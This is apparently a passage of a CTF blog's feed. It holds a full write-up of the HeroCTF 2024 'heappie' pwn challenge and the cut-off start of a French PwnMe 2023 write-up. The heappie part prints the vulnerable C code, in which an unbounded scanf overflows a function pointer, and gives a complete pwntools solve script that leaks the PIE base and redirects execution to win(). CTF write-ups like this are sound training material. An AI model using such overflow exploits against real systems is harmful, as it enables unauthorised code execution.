&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;lib64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-linux-x86-64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;b1454a58ded17f3fd2fef3a2d6a30f5cd2f104cd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;debug_info&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reading the source code, we see that we have four options:&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
<hr>
<ul>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#file-information">File Information</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#looking-for-a-vulnerability">Looking for a vulnerability</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#exploit-plan-tldr">Exploit Plan (TLDR)</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#solve-script">Solve Script</a></p>
</li>
<li>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#conclusion">Conclusion</a></p>
</li>
</ul>
<hr>
<h2 id="note">Note</h2>
<p>Writeup for the second <code>pwn</code> challenge from HeroCTF 2024.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.
</span></span></code></pre></div><h2 id="file-information">File information</h2>
<p>We are given the binary and the source code, which is written in C.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">heappie</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">heappie</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/heroctf2024/pwn/heappie/heappie&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Canary</span> <span style="color:#f92672">found</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">PIE</span> <span style="color:#f92672">enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">SHSTK</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">IBT</span><span style="color:#f92672">:</span>        <span style="color:#f92672">Enabled</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Debuginfo</span><span style="color:#f92672">:</span>  <span style="color:#f92672">Yes</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">heappie</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">pie</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">b1454a58ded17f3fd2fef3a2d6a30f5cd2f104cd</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">with</span> <span style="color:#f92672">debug_info</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
</span></span></code></pre></div><p>Reading the source code, we see that we have four options:</p>
<ol>
<li>Add Music</li>
<li>Play Music</li>
<li>Delete Music</li>
<li>Show Playlist</li>
</ol>
<p>Additionally, we have a <code>Music</code> struct that holds a play function, a title, an artist, and a description.</p>
<p>When creating a music entry, if we add sound, a random function is chosen to be the music&rsquo;s <code>play()</code> function:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_1</span>(Music<span style="color:#f92672">*</span> music) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 1: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_2</span>(Music<span style="color:#f92672">*</span> music) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 2: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_3</span>(Music<span style="color:#f92672">*</span> music) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 3: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">choose_random_play</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(choice) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_1;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_2;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_3;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>[...]
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (add_music <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>) {
</span></span><span style="display:flex;"><span>        music<span style="color:#f92672">-&gt;</span>play <span style="color:#f92672">=</span> <span style="color:#a6e22e">choose_random_play</span>();
</span></span><span style="display:flex;"><span>[...]
</span></span></code></pre></div><p>The <code>show_playlist()</code> function displays the address to which <code>music-&gt;play()</code> points:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%d. %s by %s (song: %p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist, music<span style="color:#f92672">-&gt;</span>play);
</span></span></code></pre></div><p>And most importantly, there is a <code>win()</code> function!</p>
<h2 id="looking-for-a-vulnerability">Looking for a vulnerability</h2>
<p>Our goal is to call the <code>win()</code> function, but as indicated in the checksec output, <code>PIE</code> is enabled. This means our first step will be to figure out the <code>ELF</code>&rsquo;s base address.</p>
<p>To do so, we can calculate it from the address shown by the <code>show_playlist()</code> function.
We can determine which <code>play_?()</code> function was used by playing the music (<em>option 2</em>) and retrieving the number from the output.</p>
<p>Once we know <code>win()</code>&rsquo;s address, the next step is to find a way to execute it.</p>
<p>When creating a music entry, this block of code is executed:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music title: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, music<span style="color:#f92672">-&gt;</span>title);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music artist: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, music<span style="color:#f92672">-&gt;</span>artist);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music description: &#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, music<span style="color:#f92672">-&gt;</span>description);
</span></span></code></pre></div><p>The last <code>scanf</code> call is vulnerable to an <em>overflow</em> because it does not check the size of the input.</p>
<p>Since music blocks are next to each other, overflowing the description of a music entry will overwrite the <em>next music</em>&rsquo;s pointer to <code>play()</code>, followed by its title, then its artist&hellip;.</p>
<p>We have to be careful <em>not</em> to add sound to the next music entry so that the pointer to <code>play()</code> is not overwritten by the program.</p>
<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
<ul>
<li>Make a music entry with sound.</li>
<li>Show the playlist: get the <code>music-&gt;play()</code> address.</li>
<li>Play the music: determine which <code>play_?()</code> function corresponds to it.</li>
<li>Delete the music entry.</li>
<li>Create a music entry with the payload in the description: <em>overflow</em> the next music&rsquo;s <code>play()</code> pointer with <code>win()</code>.</li>
<li>Create a music entry without sound.</li>
<li>Listen to the music: call <code>win()</code>.</li>
</ul>
<h2 id="solve-script">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./heappie&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.heroctf.fr&#34;</span>, <span style="color:#ae81ff">6000</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./heappie&#34;</span>)
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>play_offsets <span style="color:#f92672">=</span> [elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_1&#34;</span>], elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_2&#34;</span>], elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_3&#34;</span>]]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_music</span>(sound, title, artist, desc):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(y/n): &#39;</span>, sound)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;title: &#39;</span>, title)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;artist: &#39;</span>, artist)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;description: &#39;</span>, desc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read playlist to get play_? address</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ignore garbage</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;song: &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>play_address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read music</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ignore garbage</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;music &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get which play function was used</span>
</span></span><span style="display:flex;"><span>play_number <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">0</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;play &#34;</span> <span style="color:#f92672">+</span> str(play_number) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34; @ &#34;</span> <span style="color:#f92672">+</span> hex(play_address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>play_offset <span style="color:#f92672">=</span> play_offsets[play_number<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># calculate the elf&#39;s base address from it</span>
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> play_address <span style="color:#f92672">-</span> play_offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">&#34;resolved elf @ &#34;</span> <span style="color:#f92672">+</span> hex(elf<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>win_address <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;win&#34;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;win @ &#34;</span> <span style="color:#f92672">+</span> hex(win_address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># delete the first music</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># main payload</span>
</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;rami&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malek&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">128</span><span style="color:#f92672">+</span>p64(win_address))
</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;n&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pwned&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;conflict&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;lol&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># call win()</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success((<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;FLAG -&gt; &#34;</span> <span style="color:#f92672">+</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;}&#39;</span>)<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><h2 id="conclusion">Conclusion</h2>
<p>I really enjoyed this challenge as a beginner in heap exploitation.</p>
<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#top">back to top</a></p>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 PwnMe 2023 - pwn/vip_at_libc</title>
            <link>/posts/2023/05/pwnme-2023-pwn/vip_at_libc/</link>
            <pubDate>Mon, 08 May 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/05/pwnme-2023-pwn/vip_at_libc/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;VIP at LIBC&lt;/em&gt; était un challenge de pwn issu du &lt;strong&gt;PwnMe CTF 2023&lt;/strong&gt;. Un challenge &lt;em&gt;d&amp;rsquo;intro&lt;/em&gt; (??) très sympa, avec un petit plus qui lui permet de se démarquer des classiques &lt;code&gt;ret2libc&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-plaintext&#34; data-lang=&#34;plaintext&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sooo I heard that if you were VIP, you could access some specific features!  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Maybe one of those features can be used to get inside their system?  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Author: Zerotistic#0001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;a href=&#34;https://ctf.pwnme.fr/api/assets/vip_at_libc.tgz&#34;&gt;&lt;code&gt;vip_at_libc.tgz&lt;/code&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;analyse-du-fichier&#34;&gt;Analyse du fichier&lt;/h2&gt;
&lt;p&gt;On a le binaire et la &lt;code&gt;libc&lt;/code&gt; qui va avec, ça nous indique déjà qu&amp;rsquo;on va probablement devoir interagir avec.&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p><em>VIP at LIBC</em> était un challenge de pwn issu du <strong>PwnMe CTF 2023</strong>. Un challenge <em>d&rsquo;intro</em> (??) très sympa, avec un petit plus qui lui permet de se démarquer des classiques <code>ret2libc</code>.</p>
<h2 id="description">Description</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Sooo I heard that if you were VIP, you could access some specific features!  
</span></span><span style="display:flex;"><span>Maybe one of those features can be used to get inside their system?  
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>Author: Zerotistic#0001
</span></span></code></pre></div><p><a href="https://ctf.pwnme.fr/api/assets/vip_at_libc.tgz"><code>vip_at_libc.tgz</code></a></p>
<h2 id="analyse-du-fichier">Analyse du fichier</h2>
